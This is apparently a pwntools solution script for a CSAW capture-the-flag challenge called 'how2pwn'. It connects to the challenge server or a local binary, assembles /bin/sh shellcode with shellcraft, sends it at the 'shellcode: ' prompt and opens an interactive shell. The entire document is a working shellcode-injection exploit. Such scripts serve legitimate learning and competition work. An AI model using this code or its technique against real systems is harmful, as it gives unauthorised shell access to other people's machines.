from pwn import *

exe = ELF("chal1")
exe_rop = ROP(exe)
# libc = ELF("libc6_2.31-0ubuntu9.7_amd64.so")

# ld = ELF("./ld-2.27.so")

context.binary = exe
# context.log_level = 'DEBUG'

def log_print(*msg):
    log.info(" ".join(map(str,msg)))
lp = log_print
def start():
    if args.LOCAL:
        r = process([exe.path])
        if args.R2:
            input("Wait r2 attach")
    else:
        r = remote("how2pwn.chal.csaw.io", 60001)
    return r

io = start()
print()
shellcode = asm(shellcraft.sh())
print("shellcode length",len(shellcode))
io.sendlineafter(b"shellcode: ",shellcode)
io.interactive()

# 764fce03d863b5155db4af260374acc1